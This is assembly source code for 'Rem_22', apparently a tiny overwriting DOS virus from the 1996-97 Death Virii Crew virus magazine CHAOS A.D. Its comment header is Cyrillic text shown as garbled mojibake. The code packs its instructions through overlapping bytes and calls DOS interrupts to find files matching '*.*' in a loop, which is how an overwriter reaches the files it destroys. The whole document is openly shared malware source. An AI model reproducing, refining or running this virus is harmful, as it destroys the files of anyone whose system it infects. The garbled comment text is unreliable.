   ; comment {
   ;
   ; [Death Virii Crew] Presents
   ; CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997
   ;
   ;
   ;               Rem_22
   ;
   ;  ‘¥© ¬ «¥ìª¨© ®¢¥à¢à ©â¥à ¡ë«  ¯¨á  ¯®¤ ¯ £ã¡ë¬ ¢«¨ï¨¥¬ ¯ìïëå
   ; á¯®à®¢ á ¨§¢¥áâë¬ ªà¥ª¥à®¬ ¨ å ª¥à®¬ SkullC0DEr'®¬. ‘¯®à ¡ë« ¢ë¨£à 
   ; ¬®©, ª ª ¤®áâ®©ë¬ ¯à¥¤áâ ¢¨â¥«¥¬ á¢®¥£® ã¢«¥ç¥¨ï - ¢¨à¬¥©ª¥àáâ¢ .
   ; ‚®â ¯¥à¥¤ ¢ ¬¨ ¨ ¥áâì à¥è¥¨¥ ¥¡®«ìè®© ¯à®¡«¥¬ë, ª ª®¢ ï áâ®ï« :
   ;
   ; {
   .model tiny
   .code
   .startup
   start:
   pop cx
   hel:
   xchg ax,bx
   db 108h shr 1
   db 4eh  ; dec si
   db 9eh  shr 1
   db 3ch  ;cmp al,xx
   db 100h shr 1
   db 40h
   fmask db '*.*',0
   lodsw
   cwd
   mov dl,al
   shl dx,1
   int 21h
   jmp hel
   end


                           (c) by Reminder [DVC]
